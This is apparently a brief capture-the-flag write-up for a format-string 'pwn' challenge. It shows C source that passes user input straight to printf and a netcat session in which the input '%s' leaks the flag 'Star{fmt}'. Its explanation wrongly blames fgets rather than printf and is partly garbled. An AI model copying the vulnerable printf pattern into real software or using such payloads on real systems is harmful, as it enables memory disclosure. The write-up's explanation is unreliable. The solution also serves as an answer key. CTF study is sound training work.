# RTFB [1/2]

This pwn chall is based on format string. Here's the source code : 

```c
#include <stdio.h>

void menu(void) {
    puts("/\\");
    puts("/ \\");
    puts(".∧＿∧");
    puts("( ･ω･｡)つ━☆・*。");
    puts("⊂　 ノ 　　　・゜+.");
    puts("しーＪ　　　°。+ *´¨)");
    puts("　　　　　　　　　.· ´¸.·*´¨) ¸.·*¨)");
    puts("　　　　　　　　　　(¸.·´ (¸.·’* ☆ \")");
    puts("               Bienvenue dans l'antre de la format string!");
    puts("Les format specifiers sur la voie te guideront, vers le flag ils t'emporteront.");
    puts("");
}

int main(void) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    menu();
    printf(">> ");
    char input[20];
    fgets(input, sizeof(input), stdin);

    char buffer[32];
    FILE* f = fopen("flag.txt", "rt");
    fgets(buffer, sizeof(buffer), f);

    printf(input);

    return 0;
}
```

The `fgets` statement is not restricted that means we can enter something like :  `%s` and then the character will leak a park of the stack into when printed.  

```
nc challenges.hackademint.org 32448
/\
/ \
.∧＿∧
( ･ω･｡)つ━☆・*。
⊂　 ノ 　　　・゜+.
しーＪ　　　°。+ *´¨)
　　　　　　　　　.· ´¸.·*´¨) ¸.·*¨)
　　　　　　　　　　(¸.·´ (¸.·’* ☆ ")
               Bienvenue dans l'antre de la format string!
Les format specifiers sur la voie te guideront, vers le flag ils t'emporteront.

>> %s
Star{fmt}
```

Flag : `Star{fmt}`
